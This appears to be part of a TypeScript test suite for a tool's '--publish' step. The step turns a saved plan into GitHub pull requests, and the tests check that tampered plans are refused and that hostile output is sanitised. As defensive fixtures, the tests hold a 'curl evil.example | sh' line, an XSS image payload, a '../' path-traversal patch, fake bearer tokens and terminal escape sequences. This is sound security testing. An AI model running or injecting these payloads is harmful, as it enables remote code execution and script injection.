      expect.objectContaining({ state: "opened", url: "https://github.com/o/r/pull/1" }),
    ]);
    expect(renderSummary(result)).toContain(`✗ Rename max_tokens to max_completion_tokens on chat completions: nothing pushed, the plan's patch is not darnit's rewrite of this commit\n  ${MISMATCH_MEANS}`);
    expect(posts.map((p) => p.head)).toEqual([BRANCHES[1]]);
    expect(await branches(bare)).toEqual([BRANCHES[1]]);
    expect(await pushedPatch(bare, base, BRANCHES[1]!)).toBe(value.groups[1]!.patch);
    expect(exitCodeFor(result)).toBe(1);
  });

  it("opens nothing and exits 1 when the plan was written by another darnit version", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir);
    const posts = stubGitHub(branch);
    const result = await publish(await fresh(bare), plan, { version: "u" });
    const reason = 'the plan was written by darnit "t" and this is darnit u; run both jobs with the same version';
    expect(result.records.map((r) => r.pr)).toEqual([{ state: "mismatch", reason }, { state: "mismatch", reason }]);
    expect(renderSummary(result)).toContain(`nothing pushed, ${reason}\n  ${MISMATCH_MEANS}`);
    expect(exitCodeFor(result)).toBe(1);
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
  });

  it("checks the plan's commit against GITHUB_SHA in Actions, and refuses an empty or unset one", async () => {
    const { dir, bare, branch, base } = await origin();
    const plan = await prepare(dir);
    const posts = stubGitHub(branch);
    vi.stubEnv("GITHUB_ACTIONS", "true");
    const other = "0".repeat(40);
    vi.stubEnv("GITHUB_SHA", other);
    await expect(publish(await fresh(bare), plan)).rejects.toThrow(`the plan was made on commit ${base}, but GITHUB_SHA is ${other}; nothing published`);
    for (const blank of ["", " "]) {
      vi.stubEnv("GITHUB_SHA", blank);
      await expect(publish(await fresh(bare), plan)).rejects.toThrow("GITHUB_SHA is not set; in GitHub Actions --publish checks the plan's commit against it");
    }
    delete process.env.GITHUB_SHA;
    await expect(publish(await fresh(bare), plan)).rejects.toThrow("GITHUB_SHA is not set");
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
    vi.stubEnv("GITHUB_SHA", base);
    expect((await publish(await fresh(bare), plan)).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
  });

  it("keeps the plan's test output escaped, redacted and capped in the pull request body, and its notes as text", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const value = await readPlan(plan);
    const b64 = (s: string) => Buffer.from(s).toString("base64").replace(/=+$/, "");
    const noise = Array.from({ length: 1000 }, (_, i) => `noise ${i}`).join("\n");
    const hostile = [
      noise,
      "Authorization: Bearer sekret-value-1234",
      `token ${TOKEN} ${b64(`x-access-token:${TOKEN}`)} ${b64(TOKEN)}`,
      "esc \u001b[8mhidden\u001b[0m bidi ‮evil‬ c1 \u009b31m",
      "```\n</details>\n@everyone",
      "last line",
    ].join("\n");
    value.groups[0]!.tests = { command: "npm test # Authorization: Bearer sekret-cmd-9876", passed: true, attributed: null, notChecked: false, timedOut: false, output: hostile };
    value.groups[0]!.testsNote = null;
    const note = "<img src=x onerror=alert(1)> @everyone see [here](https://evil.example)";
    value.groups[0]!.buildNote = `${note} Authorization: Bearer sekret-note-5555 ${TOKEN}`;
    // The other change's notes and command go the same way.
    value.groups[1]!.build = { command: `npm run build ${TOKEN}`, passed: true, attributed: null, notChecked: false, timedOut: false, output: "" };
    value.groups[1]!.buildNote = null;
    value.groups[1]!.testsNote = note;
    await writePlan(plan, value);

    const posts = stubGitHub(branch);
    await publish(await fresh(bare), plan);
    const body = posts[0]!.body!;
    expect(body).toContain(`- [ ] build not checked: ${prose(`${note} Authorization: Bearer *** ***`)}`);
    expect(body).toContain("- [x] `npm test # Authorization: Bearer ***` passed");
    expect(posts[1]!.body).toContain(`- [x] \`npm run build ***\` passed\n- [ ] tests not run: ${prose(note)}\n`);
    for (const text of [body, posts[1]!.body!]) {
      expect(text).not.toMatch(/(?<!`)<img/);
      expect(text).not.toContain("](https://evil.example)");
      expect(text).not.toMatch(/sekret|ghp_/);
    }
    for (const form of [TOKEN, b64(`x-access-token:${TOKEN}`), b64(TOKEN)]) expect(body).not.toContain(form);
    expect(body).toContain("Authorization: Bearer ***\ntoken *** *** ***\nesc hidden bidi \\u202eevil\\u202c c1 \\u009b31m");
    // eslint-disable-next-line no-control-regex
    expect(body).not.toMatch(/[\u001b\u009b‮]/);
    // The last 40 lines, in a fence no line of them closes.
    expect(body).toContain("````\nnoise 967\n");
    expect(body).not.toContain("noise 966\n");
    expect(body).toContain("last line\n````\n");

    // Output over the plan's cap is refused with the whole plan.
    value.groups[0]!.tests.output = "x".repeat(1024 * 1024);
    await writeFile(join(plan, "plan.json"), JSON.stringify(value));
    await expect(publish(await fresh(bare), plan)).rejects.toThrow("tests.output: over the cap of 16384 characters");
    expect(posts).toHaveLength(2);
  });

  it("opens no pull request for a change whose build failed in the plan, and words a rerun for --publish", async () => {
    const { dir, bare } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const value = await readPlan(plan);
    const run = { passed: false, notChecked: false, output: "" } as const;
    value.groups[0] = { ...value.groups[0]!, build: { ...run, command: "npm run build", attributed: "change", timedOut: false }, buildNote: null, tests: null, testsNote: "the build failed first" };
    value.groups[1] = { ...value.groups[1]!, tests: { ...run, command: "npm test", attributed: null, timedOut: true }, testsNote: null };
    await writePlan(plan, value);
    vi.stubGlobal("fetch", () => Promise.reject(new Error("no request expected")));
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["build-failed", "tests-failed"]);
    expect(exitCodeFor(result)).toBe(1);
    const summary = renderSummary(result);
    expect(summary).toContain("nothing pushed\n  build: npm run build failed; files put back. The change broke your build.");
    expect(summary).toContain("tests: npm test timed out after 10 minutes; files put back, since a run that did not finish can't check the change. Rerun --prepare with --no-test to apply it");
    expect(summary).not.toContain("Rerun with --no-test");
    value.groups[1].tests = { ...run, command: "npm test", attributed: "baseline", timedOut: false };
    await writePlan(plan, value);
    expect(renderSummary(await publish(await fresh(bare), plan))).toContain("They already fail without the change. Fix them first, or rerun --prepare with --no-test to apply it");
    expect(await branches(bare)).toEqual([]);
  });

  it("reports a change the plan says failed with the plan's result, and opens no pull request for it", async () => {
    const { dir, bare } = await origin();
    const breaks = "node -e \"process.exit(require('fs').readFileSync('app.js','utf8').includes('max_completion_tokens') ? 1 : 0)\"";
    const plan = await prepare(dir, { test: breaks });
    // With nothing to open, it needs no token and asks GitHub nothing.
    const asked: string[] = [];
    vi.stubGlobal("fetch", (url: string) => Promise.reject(new Error(`asked ${asked.push(url)}`)));
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => r.pr?.state)).toEqual(["tests-failed", "tests-failed"]);
    expect(renderSummary(result)).toContain("nothing pushed\n  tests: node -e");
    expect(exitCodeFor(result)).toBe(1);
    expect(asked).toEqual([]);
    expect(await branches(bare)).toEqual([]);
  });

  it("says so for a change in the plan that darnit does not make on this commit at all", async () => {
    const { dir, bare, branch } = await origin();
    const value = await readPlan(await prepare(dir, { noTest: true }));
    // The same files with no call sites left, pushed to the remote, and a plan for that commit carrying the earlier patch.
    await fix(dir, { noTest: true });
    await git(dir, ["add", "."]);
    await commit(dir, "fixed by hand");
    await git(dir, ["push", "-q", "origin", branch], 60);
    const fixedBase = (await git(dir, ["rev-parse", "HEAD"])).trim();
    const plan = join(await temp("darnit-plan-"), "plan");
    await mkdir(plan);
    await writePlan(plan, { ...value, base: fixedBase, groups: [value.groups[1]!] });
    const posts = stubGitHub(branch);
    const result = await publish(await fresh(bare), plan);
    expect(result.records.map((r) => [r.record.id, r.pr])).toEqual([[COPY, { state: "mismatch", reason: "the plan's patch is not darnit's rewrite of this commit" }]]);
    expect(renderSummary(result)).toContain(`✗ The same rename, again: nothing pushed, the plan's patch is not darnit's rewrite of this commit\n  ${MISMATCH_MEANS}`);
    expect(exitCodeFor(result)).toBe(1);
    expect(posts).toEqual([]);
  });

  it.each([
    ["a record this darnit does not have", (p: Plan) => ({ ...p, groups: [{ ...p.groups[0]!, id: "openai:2024-09-12:not-a-record" }] }), "plan names a change record this darnit does not have"],
    [
      "a path with ..",
      (p: Plan) => ({ ...p, groups: [{ ...p.groups[0]!, files: ["../app.py"], patch: p.groups[0]!.patch.replaceAll("a/app.py", "a/../app.py").replaceAll("b/app.py", "b/../app.py") }] }),
      "is not a path inside the repository",
    ],
    ["a change twice", (p: Plan) => ({ ...p, groups: [p.groups[0]!, p.groups[0]!] }), "plan names a change record twice"],
    ["an unknown field", (p: Plan) => ({ ...p, run: "curl evil.example | sh" }), 'unknown field "run"'],
    ["text that is not JSON", () => "{", "plan is not JSON"],
  ])("refuses a plan naming %s, and opens nothing", async (_, change, message) => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const changed = change(await readPlan(plan));
    await writeFile(join(plan, "plan.json"), typeof changed === "string" ? changed : JSON.stringify(changed));
    const posts = stubGitHub(branch);
    await expect(publish(await fresh(bare), plan)).rejects.toThrow(message);
    expect(posts).toEqual([]);
    expect(await branches(bare)).toEqual([]);
  });

  it("refuses a plan folder that is missing, a link, or holds anything but a plain plan.json", async () => {
    const { dir, bare, branch } = await origin();
    const plan = await prepare(dir, { noTest: true });
    const home = await temp("darnit-plans-");
    await symlink(plan, join(home, "link"));
    await mkdir(join(home, "extra"));
    await cp(join(plan, "plan.json"), join(home, "extra", "plan.json"));
    await writeFile(join(home, "extra", "notes.txt"), "");
    await mkdir(join(home, "linked"));
    await symlink(join(plan, "plan.json"), join(home, "linked", "plan.json"));
    await mkdir(join(home, "pipe"));
    await exec("mkfifo", [join(home, "pipe", "plan.json")]);
    await mkdir(join(home, "empty"));
    const job2 = await fresh(bare);
    const posts = stubGitHub(branch);
    for (const [name, why] of [
      ["missing", "does not exist"],
      ["link", "is a symbolic link"],
      ["extra", "must hold plan.json and nothing else"],
      ["empty", "must hold plan.json and nothing else"],
      ["linked", "is not a plain file"],
      ["pipe", "is not a plain file"],
    ]) {
      await expect(publish(job2, join(home, name!))).rejects.toThrow(why);
    }
    expect(posts).toEqual([]);
    expect((await publish(job2, plan)).records.map((r) => r.pr?.state)).toEqual(["opened", "opened"]);
  });

  it("refuses --prepare, --pr, --dry-run, --only, --test and --no-test alongside it", async () => {
    const { dir } = await origin();
    const plan = await prepare(dir, { noTest: true });
    for (const [opts, message] of [
      [{ prepare: plan }, "--publish and --prepare can't be combined"],
      [{ pr: true }, "--publish and --pr can't be combined"],
      [{ dryRun: true }, "--publish and --dry-run can't be combined"],
      [{ only: [MAX] }, "--publish and --only can't be combined"],
      [{ test: "node -e 1" }, "--publish and --test can't be combined"],
      [{ noTest: true }, "--publish and --no-test can't be combined"],
    ] as [FixOptions, string][]) {
      await expect(publish(dir, plan, opts)).rejects.toThrow(message);
    }
    for (const [args, message] of [
      [["--publish", plan, "--pr"], "--publish and --pr can't be combined"],
      [["--publish", ""], "--publish needs the folder that holds the plan"],
      [["--publish", "--json"], "--publish needs the folder that holds the plan"],
      [["--publish", join(plan, "nowhere")], "does not exist; give --publish the folder --prepare wrote"],
    ]) {
      const run = await cli(dir, {}, "fix", ...args!);
      expect(run.code).toBe(2);
      expect(run.stderr).toContain(message);
    }
  });
});
